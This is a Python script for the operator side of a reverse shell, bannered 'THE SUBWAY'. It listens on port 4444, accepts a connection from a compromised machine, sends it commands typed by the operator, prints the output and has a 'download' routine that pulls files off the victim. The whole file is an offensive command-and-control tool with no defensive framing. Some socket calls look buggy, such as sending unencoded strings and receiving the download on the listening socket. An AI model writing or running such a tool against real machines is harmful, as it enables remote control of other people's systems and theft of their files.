import sys
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 4444
BUFFER_SIZE = 1024


def banner():
    print(
'''
<---------------------------------->
            THE SUBWAY                >
<---------------------------------->
''')


def download():
    try:
        f = input('Type file name: ')
        file = str(f)
        sock.send(file)
        f = open(file, 'wb')
        i = sock.recv(BUFFER_SIZE)
        while not ('complete' in str(i)):
            f.write(i)
            i = sock.recv(BUFFER_SIZE)
        f.close()
    except Exception as e:
        print(e)
        intake = input('Try Again? [y/n] ')
        if intake == 'n':
            pass
        elif intake == 'y':
            download()
        else:
            print('Input incorrect')
            pass


def connect():
    global sock
    global SERVER_PORT
    global SERVER_HOST
    global BUFFER_SIZE

    try:
        sock.bind((SERVER_HOST, SERVER_PORT))
        print(f'listening through {SERVER_HOST}:{SERVER_PORT}')
        sock.listen(5)
    except socket.error as e:
        print(e)
        connect()
    else:
        client_socket, client_address = sock.accept()
        print(f'{client_socket}:{client_address} CONNECTED.')
        while True:
            cmd = input("Enter command [type 'quit' to end session]: ")
            if cmd == 'quit':
                print('SESSION CLOSED.')
                client_socket.close()
                sock.close()
                sys.exit()
            elif cmd == 'download':
                client_socket.send(cmd)
                download()
            else:
                client_socket.send(cmd.encode())
                result = client_socket.recv(BUFFER_SIZE).decode()
                print(result)
            continue


if __name__ == '__main__':
    banner()
    connect()
